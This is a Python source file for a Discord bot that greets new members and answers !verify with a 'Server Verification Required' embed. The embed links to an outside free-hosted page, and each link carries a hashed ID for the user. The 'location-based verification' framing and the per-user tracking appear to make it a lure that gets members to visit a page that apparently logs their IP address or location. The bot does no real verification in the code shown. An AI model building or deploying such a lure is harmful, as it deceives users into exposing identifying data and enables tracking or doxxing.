import discord
import hashlib
import os

# Get token from environment variable (safer for cloud hosting)
TOKEN = os.environ.get('DISCORD_TOKEN')

# Your hosted verification page URL
VERIFY_URL = 'https://authgg.rf.gd'  # Change this

class Bot(discord.Client):
    async def on_ready(self):
        print(f'[+] Bot is online as {self.user}')

    async def on_message(self, message):
        if message.author.bot:
            return
        if message.content.startswith('!verify'):
            user_hash = hashlib.md5(str(message.author.id).encode()).hexdigest()[:8]
            verify_link = f"{VERIFY_URL}/?uid={user_hash}"
            embed = discord.Embed(
                title="🔐 Server Verification Required",
                description=(
                    "This server requires location-based verification.\n\n"
                    f"**[Click Here to Complete Verification]({verify_link})**\n\n"
                    "One-time process, takes less than 10 seconds."
                ),
                color=0x5865F2
            )
            await message.channel.send(content=f"{message.author.mention}", embed=embed)

    async def on_member_join(self, member):
        user_hash = hashlib.md5(str(member.id).encode()).hexdigest()[:8]
        verify_link = f"{VERIFY_URL}/?uid={user_hash}"
        embed = discord.Embed(
            title="🔐 Welcome! Please Verify",
            description=(
                f"Welcome to **{member.guild.name}**!\n\n"
                f"**[Click Here to Verify]({verify_link})**"
            ),
            color=0x5865F2
        )
        try:
            await member.send(embed=embed)
        except:
            pass

client = Bot(intents=discord.Intents.all())
client.run(TOKEN)
